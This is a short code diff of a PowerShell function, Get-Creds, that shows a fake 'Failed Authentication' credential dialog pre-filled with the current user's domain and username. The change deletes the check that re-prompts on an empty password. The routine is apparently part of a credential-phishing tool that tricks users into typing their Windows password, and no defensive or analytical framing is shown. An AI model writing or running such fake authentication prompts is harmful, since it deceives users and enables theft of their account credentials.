@@ -28,10 +28,7 @@
 function Get-Creds {
     do {
         $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName + '\' + [Environment]::UserName, [Environment]::UserDomainName)
-        if ([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
-            [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
-            Get-Creds
-        }
+        
         return $cred
         # ...
 
